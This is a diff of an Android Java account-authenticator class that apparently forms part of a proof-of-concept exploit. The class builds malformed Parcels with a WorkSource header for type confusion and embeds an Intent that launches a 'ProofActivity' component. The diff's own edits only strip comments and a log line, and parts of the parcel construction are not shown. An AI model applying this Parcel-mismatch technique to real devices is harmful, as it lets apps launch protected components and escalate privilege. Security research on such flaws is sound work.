@@ -9,7 +9,6 @@ import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
 import android.os.Parcel;
-import android.provider.Settings;
 import android.util.Log;
 
 public class MyAuthenticator extends AbstractAccountAuthenticator {
@@ -29,19 +28,18 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
             throws NetworkErrorException {
         final String TAG = "BadParcel";
 
-        // ---- BadParcel: ProofActivity を起動するIntent ----
+        // ProofActivity を起動するIntent
         Intent intent = new Intent();
         intent.setComponent(new ComponentName("com.example.tzpoc",
                 "com.example.tzpoc.ProofActivity"));
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        // ----
 
         Bundle bundle = new Bundle();
         Parcel obtain = Parcel.obtain();
         Parcel obtain2 = Parcel.obtain();
         Parcel obtain3 = Parcel.obtain();
 
-        // WorkSource ヘッダー (型混淆用)
+        // WorkSource ヘッダー（型混淆用）
         obtain2.writeInt(3);
         obtain2.writeInt(13);
         obtain2.writeInt(2);
@@ -79,7 +77,6 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
         obtain2.writeInt(13);
         obtain2.writeInt(-1);
 
-        // "intent" キーに Intent を埋め込む
         int dataPosition = obtain2.dataPosition();
         obtain2.writeString("intent");
         obtain2.writeInt(4);  // PARCELABLE
@@ -102,7 +99,6 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
 
         try {
             bundle.readFromParcel(obtain);
-            Log.d(TAG, "Bundle created successfully");
         } catch (Exception e) {
             Log.e(TAG, "Failed to read parcel: " + e.getMessage());
             return new Bundle();
@@ -116,7 +112,7 @@ public class MyAuthenticator extends AbstractAccountAuthenticator {
         return bundle;
     }
 
-    // その他の必須オーバーライド（空実装）
+    // その他必須オーバーライド（空実装）
     @Override
     public Bundle confirmCredentials(AccountAuthenticatorResponse response, Account account, Bundle options) {
         return null;
